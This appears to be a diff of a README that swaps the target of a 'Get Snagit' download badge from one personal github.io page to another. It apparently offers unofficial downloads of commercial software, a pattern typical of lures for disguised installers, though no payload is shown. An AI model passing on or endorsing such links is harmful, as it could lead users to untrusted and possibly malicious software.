@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://manhyusuu48.github.io/.github/Snagit">  
+<a href="https://tembilamusion.github.io/.github/Snagit">  
 <img src="https://img.shields.io/badge/📸_Get_Snagit-FF6600?style=for-the-badge&logo=apple&logoColor=white" alt="Get Snagit">  
 </a>  
 </div>  
